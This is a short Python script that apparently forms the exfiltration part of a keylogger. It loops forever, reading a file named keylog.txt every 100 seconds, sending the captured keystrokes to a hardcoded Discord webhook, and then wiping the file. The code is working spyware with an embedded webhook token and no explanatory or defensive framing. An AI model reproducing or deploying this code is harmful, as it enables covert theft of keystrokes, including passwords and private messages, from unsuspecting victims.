from dhooks import Webhook
import time

hook = Webhook ("https://discord.com/api/webhooks/1403879249550643331/PkMQvk-fo0oxhsXNMTwoTkFMy_gGN6KIfk8NRFnvxgppHDeQTEfAspy-LHw2-K3dKiPb")

def send():



    with open("keylog.txt", "r") as file:
        content = file.read()


    if not content.strip():
        return

    # data = "hello world test!"

    hook.send(content)

    with open("keylog.txt", "r+") as con:
        con.seek(0)
        con.truncate()


while True:
    send()
    time.sleep(100)
